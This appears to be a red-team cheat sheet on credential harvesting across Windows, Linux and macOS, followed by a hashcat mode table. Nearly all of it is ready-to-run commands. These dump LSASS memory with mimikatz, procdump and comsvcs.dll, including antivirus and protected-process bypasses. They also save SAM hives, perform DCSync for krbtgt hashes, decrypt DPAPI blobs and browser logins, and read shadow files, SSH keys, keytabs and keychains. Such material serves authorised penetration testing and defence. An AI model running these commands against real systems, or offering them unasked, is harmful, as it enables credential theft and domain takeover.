# Credential Harvesting — Steal & Decrypt Secrets (Windows / Linux / macOS)

## Table of Contents
1. [Windows: LSASS](#lsass)
2. [Windows: SAM / SECURITY / SYSTEM](#sam)
3. [Windows: NTDS.dit & DCSync](#ntds)
4. [Windows: DPAPI (Vault/Credentials/Chrome)](#dpapi)
5. [Windows: Other stores](#winother)
6. [Linux](#linux)
7. [macOS](#macos)
8. [Cracking](#cracking)

<a name="lsass"></a>
## 1. Windows LSASS (in-memory)

```cmd
:: Mimikatz (if AV allows)
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "sekurlsa::ekeys" "exit"

:: AV-bypass: dump with signed procdump then parse offline
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit

:: comsvcs.dll dump (no procdump binary needed)
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> lsass.dmp full

:: Task Manager GUI → Create dump file.  PPLBlade / SharpDump for PPL lsass.
:: Meterpreter: load kiwi; creds_all
```
If LSASS is PPL: use PPLdump/PPLBlade, or dump via kernel/BYOVD. Offline parse with **pypykatz**:
`pypykatz lsa minidump lsass.dmp`

<a name="sam"></a>
## 2. Windows SAM / SECURITY / SYSTEM

```cmd
reg save HKLM\sam sam.hiv
reg save HKLM\system system.hiv
reg save HKLM\security security.hiv
```
```bash
# offline
impacket-secretsdump -sam sam.hiv -security security.hiv -system system.hiv LOCAL
samdump2 system.hiv sam.hiv
```
Also Volume Shadow Copy or Invoke-NinjaCopy for live `C:\Windows\System32\config\SAM`.

<a name="ntds"></a>
## 3. NTDS.dit & DCSync (Domain)

Need DA/EA (or DC local admin for file copy).
```bash
# DCSync (no file needed) — requires DS-Replication rights
secretsdump.py -just-dc-ntlm <DOMAIN>/<DAUser>:<pass>@<DC_IP>
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<user>@<DC>
mimikatz "lsadump::dcsync /user:DOMAIN\krbtgt"
# cme/nxc: --ntds

# File copy via vssadmin/ntdsutil, then:
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```
Grab krbtgt hash → Golden Ticket. See active-directory.md.

<a name="dpapi"></a>
## 4. DPAPI (per-user encrypted blobs)

Master keys: `%APPDATA%\Microsoft\Protect\<SID>\` (user), machine keys from SYSTEM/SECURITY (`DPAPI_SYSTEM`).
```cmd
:: Mimikatz
dpapi::masterkey /in:"%APPDATA%\Microsoft\Protect\<SID>\<GUID>" /rpc     :: via DC RPC
dpapi::cred /in:<credentialfile> /masterkey:<key>
sekurlsa::dpapi                                       :: masterkeys from memory
vault::list  &  vaultcmd /listcreds:"Windows Credentials" /all
```
```cmd
:: SharpDPAPI (no mimikatz needed)
SharpDPAPI.exe masterkeys /rpc
SharpDPAPI.exe triage /unprotect
SharpDPAPI.exe machinetriage
SharpChrome.exe cookies /unprotect
SharpChrome.exe logins /unprotect
```
```bash
# Impacket offline
python3 dpapi.py masterkey -file <GUID> -sid <SID> -password 'UserPass'
python3 dpapi.py credential -file <blob> -key 0x<MASTERKEY>
```
Domain backup key (decrypt any user): `lsadump::backupkeys /system:<DC> /export` → `.pvk`, then SharpDPAPI `/pvk:key.pvk`.

<a name="winother"></a>
## 5. Windows Other Stores

- **Credential Manager / cmdkey**: `cmdkey /list`, runas /savecred. Invoke-WCMDump.
- **Browsers**: Chrome/Edge via SharpChrome or LaZagne; Firefox key4.db.
- **Wifi**: `netsh wlan show profiles`, key=clear.
- **RDP saved**: `mstsc` .rdg files (SharpDPAPI rdg), registry Terminal Server Client.
- **PuTTY/WinSCP/FileZilla/SuperPuTTY**: SessionGopher.
- **LAPS passwords** (local admin): see active-directory.md §LAPS.
- **GPP cPassword** (SYSVOL): gpp-decrypt.
- **Kerberoast/ASREP**: see active-directory.md.
- **LaZagne.exe all** — broad sweep (browsers, wifi, sysadmin, etc.)
- **IIS web.config connectionStrings**, OpenVPN, hMailServer DB (Blowfish static key).
- **SSMS sqlstudio.bin**, WTS impersonator.

<a name="linux"></a>
## 6. Linux

```bash
cat /etc/shadow                      # needs root/shadow group
cat /etc/passwd; getent shadow
# password reuse: try each shadow hash after cracking; try su - user with found plaintext
grep -RilE 'password|passwd|pwd' /etc /home /var/www /opt /root 2>/dev/null | grep -v Binary
cat /home/*/.bash_history /root/.bash_history 2>/dev/null | grep -iE 'pass|ssh|mysql'
find / -name "*.pem" -o -name "id_rsa*" -o -name "*.key" -o -name "authorized_keys" 2>/dev/null
find / -name ".env" -o -name "*.conf" -o -name "config.php" -o -name "wp-config.php" 2>/dev/null
cat /home/*/.netrc /home/*/.my.cnf /home/*/.pgpass 2>/dev/null
# process env (may hold tokens): tr '\0' '\n' < /proc/<pid>/environ
# memory strings: strings /dev/mem -n10 | grep -i pass  (needs root/kmem)
# systemd unit secrets: grep -R "^Environment=" /etc/systemd /lib/systemd
# GPG keys: copy ~/.gnupg, GNUPGHOME= gpg -d
# SSH agent forwarding sockets: ls /tmp/ssh-* /run/user/*/ssh-* → SSH_AUTH_SOCK=... ssh next-hop
# keytab: klist -k -t -e /etc/krb5.keytab; keytabextract.py  (Linux AD join)
# ccache reuse: export KRB5CCNAME=/tmp/krb5cc_1000
```

<a name="macos"></a>
## 7. macOS

```bash
# keychain
security dump-keychain ~/Library/Keychains/login.keychain-db
security find-generic-password -ga <service>     # -ga prints password
# TCC.db (FDA-gated): /Library/Application Support/com.apple.TCC/TCC.db
# browser creds, ssh keys, history as in Linux
# local user hashes: dscl . read /Users/<name>
# FileVault/securetoken
```

<a name="cracking"></a>
## 8. Cracking

| Hash type | Mode |
|---|---|
| NTLM | 1000 |
| LM | 3000 |
| NetNTLMv1 | 5500 |
| NetNTLMv2 | 5600 |
| Kerberoast RC4 (etype23) | 13100 |
| Kerberoast AES128/256 | 19600 / 19700 |
| ASREP etype23 | 18200 |
| Linux shadow sha512crypt ($6$) | 1800 |
| Linux shadow yescrypt | varies |
| DPAPI masterkey | 22102 |
| NTP TimeRoast | 31300 |
| krb5 asrep / tgs per etype | above |

```bash
hashcat -m 1000 hashes.txt wordlist.txt -O -w4
hashcat -m 13100 kerb.txt wordlist.txt
john --wordlist=rockyou.txt --format=nt hashes
# rules: -r /usr/share/hashcat/rules/best64.rule
```
Team has john, hashcat at /usr/sbin/john and /usr/bin/hashcat.
